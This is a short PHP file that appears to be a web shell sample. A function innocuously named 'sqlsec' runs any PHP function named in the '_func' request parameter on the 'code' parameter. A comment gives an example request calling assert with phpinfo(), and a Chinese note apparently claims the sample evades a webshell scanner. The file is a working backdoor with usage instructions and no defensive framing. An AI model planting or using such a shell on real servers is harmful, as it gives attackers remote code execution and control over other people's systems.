<?php 
    function sqlsec($a,$b){
        $a($b);
    }

    sqlsec($_REQUEST["_func"],$_REQUEST['code']);
?>

<!-- 
/assert_param.php?_func=assert&code=phpinfo();

过灭绝师太
 -->